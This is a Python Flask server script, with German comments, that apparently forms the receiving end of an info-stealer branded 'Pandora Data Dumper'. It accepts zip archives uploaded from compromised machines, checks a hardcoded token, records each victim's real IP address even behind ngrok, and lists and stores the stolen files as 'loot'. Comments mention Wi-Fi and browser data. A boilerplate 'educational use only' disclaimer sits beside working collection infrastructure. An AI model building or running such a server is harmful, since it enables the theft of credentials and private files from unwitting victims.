from flask import Flask, request
import os
import zipfile
import io
from tabulate import tabulate
from datetime import datetime
from colorama import init, Fore, Style

# Initialisierung
init(autoreset=True)

app = Flask(__name__)
SECRET_TOKEN = "MeinSicheresPasswort123"
UPLOAD_FOLDER = 'loot_storage'

if not os.path.exists(UPLOAD_FOLDER): 
    os.makedirs(UPLOAD_FOLDER)

def get_client_ip():
    """Extrahiert die echte IP-Adresse des Clients, auch hinter ngrok."""
    if request.headers.get('X-Forwarded-For'):
        # X-Forwarded-For kann eine Liste von IPs sein, die erste ist die echte Client-IP
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

def print_rainbow_branding():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = r"""
==================================================================================================
              8888888b.                            888                              
              888   Y88b                           888                              
              888    888                           888                              
              888   d88P 8888b.  88888b.   .d8888b.888  .d8888b.  888d888 8888b.    
              8888888P"     "88b 888 "88b  d88"   8888 d88"   88b 888P"      "88b   
              888       .d888888 888  888  888    8888 888    888 888    .d888888   
              888       888  888 888  888  Y88b  d8888 Y88b  d88P 888    888  888   
              888       "Y888888 888  888  "Y8888P"888  "Y8888P"  888    "Y888888   

                    ::: Aplication Development by ✘ 𝘼𝙠𝙞_SystemDown® ©2026 :::
==================================================================================================
           ______
        .-"      "-.
       /            \
      |              |       -----------------------------------------------------
      |,  .-.  .-.  ,|       Status:          > System Injection successful <
      | )(__/  \__)( |                        > System Online 🟢 <
      |/     /\     \|       Description:     > Pandora Data Dumper <
      (_     ^^     _)                        
       \__|IIIIII|__/        Version:         1.0.0
        | \IIIIII/ |         Author:          AKI_SystemDown® / Pandora® ©2026
        \          /         "Curiosity didn't kill the cat; it unlocked the box."
         `--------´          -----------------------------------------------------
         
    ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
    ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
    ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
    ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
    ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    
==================================================================================================

        ==================================================================================
                                           DISCLAIMER
        ==================================================================================
          This software is provided for EDUCATIONAL and ETHICAL TESTING purposes only.   
          The author (Pandora-Script) shall NOT be held responsible for any misuse,      
          damage, or illegal activities caused by this program.                          
    
          Use this tool only on systems you own or have explicit permission to test.
          Unauthorized access to computer systems is illegal in most jurisdictions.
    
          BY USING THIS SOFTWARE, YOU AGREE TO TAKE FULL RESPONSIBILITY FOR YOUR ACTIONS.
        ==================================================================================
    """
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for i, line in enumerate(logo.split('\n')):
        print(colors[i % len(colors)] + Style.BRIGHT + line)
    print(Fore.WHITE + Style.BRIGHT + "-"*82 + "\n")

def print_loot_table(client_ip, file_list):
    table_data = []
    for file_path in file_list:
        if file_path == "wlan.txt": continue
        folder = os.path.dirname(file_path)
        filename = os.path.basename(file_path)
        table_data.append([filename, folder if folder else "Root"])

    print(f"\n{Fore.CYAN}{Style.BRIGHT}[+] DATENPAKET EMPFANGEN")
    print(f"{Fore.WHITE}Echte Client-IP:      {Fore.YELLOW}{Style.BRIGHT}{client_ip}")
    print(f"{Fore.WHITE}Zeitpunkt:            {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}")
    
    if table_data:
        print(tabulate(table_data, headers=["Datei", "Original-Pfad"], tablefmt="fancy_grid"))
    else:
        print(f"{Fore.YELLOW}[*] Nur System-Logs (WLAN/Browser) erhalten.\n")

@app.route('/upload', methods=['POST'])
def upload_file():
    client_ip = get_client_ip()
    
    if request.headers.get('X-Auth-Token') != SECRET_TOKEN:
        print(f"{Fore.RED}[!] AUTH-FEHLER: Ungültiger Zugriff von {client_ip}")
        return "Unauthorized", 401

    file = request.files.get('file')
    if not file: return "No file", 400

    file_bytes = file.read()
    try:
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
            print_loot_table(client_ip, z.namelist())
            
            # --- FIX FÜR WINDOWS DATEINAMEN (IPv6) ---
            # Wir ersetzen Doppelpunkte durch Unterstriche, damit Windows den Pfad akzeptiert
            safe_ip = client_ip.replace(":", "_")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(UPLOAD_FOLDER, f"loot_{safe_ip}_{timestamp}.zip")
            
            with open(save_path, "wb") as f:
                f.write(file_bytes)
    except Exception as e:
        print(f"{Fore.RED}[!] Fehler bei {client_ip}: {e}")

    return "OK", 200

if __name__ == '__main__':
    print_rainbow_branding()
    print(f"{Fore.GREEN}--> Pandora Server bereit auf Port 3000...")
    app.run(host='0.0.0.0', port=3000, debug=False)